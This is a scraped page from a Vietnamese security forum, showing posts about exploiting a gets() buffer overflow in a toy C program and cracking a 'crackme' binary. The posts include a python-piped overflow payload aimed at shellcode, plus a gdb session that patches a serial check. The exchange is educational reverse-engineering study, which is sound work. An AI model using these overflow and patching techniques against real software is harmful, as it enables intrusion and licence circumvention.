				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24349.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24349/148757.html#148757,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><blockquote> #include &lt;string.h&gt;<br/> #include &lt;stdio.h&gt;<br/><br/> int main(int argc, char **argv)<br/> {<br/> char <font color='yellow'>name[8]</font>;<br/> printf("What is your name: ");<br/> gets(name);<br/> printf("Aha, your name is: %s\n",name);<br/> return 0;<br/> }<br/> @Ta&nbsp;
</blockquote>l: Đề nghị bạn <font color='yellow'>đọc kỹ</font> lại đoạn code của bạn xem độ dài buffer là bao nhiêu trước khi tiếp tục <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24349.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24349/148518.html#148518,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Nhìn đoạn disassembly của bạn, mình đề nghị bạn chạy thử cái này xem:<br/> python -c 'print "A"*12 + "\xAA\xBB\xXCC\xDD"' |./vul<br/><br/> Lưuý: \xAA\xBB\xCC\xDD là địa chỉ biến môi trường CODE chứa shellcode của bạn<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24349.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24349/147048.html#147048,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">@Tal: bạn phải gdb debug xem chuyện gì xảy ra chứ ? Chứ nói vậy ai mà mò dùm bạn?<br/> Trước hết bạn cho vài thông tin:<br/> 1.gcc --version<br/> 2.gdb ./target<br/> disassemble main<br/> ... vv</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/36.html">Thủ thuật reverse engineering</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22743.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22743/146400.html#146400,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Còn một cách nữa để phishing serial là dùng cách này của bác Izik<br/> Tham khảo<br/> <span class="link"> http://www.tty64.org/doc/revengwithld.txt</span></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/36.html">Thủ thuật reverse engineering</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22743.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22743/146396.html#146396,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">mrro wrote:</cite><br>
<blockquote>Nếu chỉ cần hiện ra "Great work!" thì có cách đơn giản thế này:<br/><br/> $ python -c 'print "\x00\x0a\x00\x0a"' | ./small<br/> -&gt; Small crackme for Stingduk &lt;-<br/> Give me your name (max 50 chars): Pass me the serial (max 50 chars): Great work!&nbsp;
</blockquote><br/> Trường hợp của bạn mrro là một tình huống đặc biệt của keygen <img src="/hvaonline/images/smilies/e746f170e2a60a973f6f1b2abdbfa5a7.gif" border="0" alt="smilie" align="absbottom"> và \x0a tương đương với "\r\n" <img src="/hvaonline/images/smilies/e746f170e2a60a973f6f1b2abdbfa5a7.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/e746f170e2a60a973f6f1b2abdbfa5a7.gif" border="0" alt="smilie" align="absbottom"><br/> Nên dùng python để input cái serial của bạn mèo thì cũng có thể làm thế này ?<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>python -c 'print "meoluoi\x0a9118715\x0a"' |./small</pre>
</div><br/> hoặc đặc biệt hơn nữa<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>python -c 'print "\x00\x20\x00"' |./small</pre>
</div><br/> <img src="/hvaonline/images/smilies/e746f170e2a60a973f6f1b2abdbfa5a7.gif" border="0" alt="smilie" align="absbottom"><br/> Còn mình chỉ biết patch <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>$ gdb --write ./small -q
Using host libthread_db library "/lib/libthread_db.so.1".
&#40;gdb&#41; disassemble main
Dump of assembler code for function main:
0x080487bc &lt;main+0&gt;: push %ebp
0x080487bd &lt;main+1&gt;: mov %esp,%ebp
0x080487bf &lt;main+3&gt;: sub $0xe8,%esp
.........................
.........................
0x080488c4 &lt;main+264&gt;: push %eax ; fake serial
0x080488c5 &lt;main+265&gt;: push %edx ; real serial
0x080488c6 &lt;main+266&gt;: call 0x8048668 &lt;strcmp@plt&gt; ;bp here
0x080488cb &lt;main+271&gt;: add $0x10,%esp
0x080488ce &lt;main+274&gt;: test %eax,%eax
0x080488d0 &lt;main+276&gt;: jne 0x80488fa &lt;main+318&gt; ; Nhảy đến Bad boy nếu sai serial, có thể patch tại đây
0x080488d2 &lt;main+278&gt;: sub $0x8,%esp
0x080488d5 &lt;main+281&gt;: push $0x80486d8
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---return
0x080488da &lt;main+286&gt;: sub $0xc,%esp
0x080488dd &lt;main+289&gt;: push $0x8048b84 ; Great work!
0x080488e2 &lt;main+294&gt;: push $0x8049db8
0x080488e7 &lt;main+299&gt;: call 0x8048698 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
0x080488ec &lt;main+304&gt;: add $0x14,%esp
0x080488ef &lt;main+307&gt;: push %eax
0x080488f0 &lt;main+308&gt;: call 0x8048658 &lt;_ZNSolsEPFRSoS_E@plt&gt;
0x080488f5 &lt;main+313&gt;: add $0x10,%esp
0x080488f8 &lt;main+316&gt;: jmp 0x8048920 &lt;main+356&gt;
0x080488fa &lt;main+318&gt;: sub $0x8,%esp
0x080488fd &lt;main+321&gt;: push $0x80486d8
0x08048902 &lt;main+326&gt;: sub $0xc,%esp
0x08048905 &lt;main+329&gt;: push $0x8048b90 ; No luck here mate
0x0804890a &lt;main+334&gt;: push $0x8049db8
------
&#40;gdb&#41; x/x *0x080488d0
0xec832875: Cannot access memory at address 0xec832875
&#40;gdb&#41; set {int} 0x080488d0=0xec832874
&#40;gdb&#41; quit</pre>
</div><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>$ ./small
-&gt; Small crackme for Stingduk &lt;-
Give me your name &#40;max 50 chars&#41;: hello-world
Pass me the serial &#40;max 50 chars&#41;: gudbye-world
Great work!</pre>
</div><br/><br/><br/><br/><br/><br/><br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right"></td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
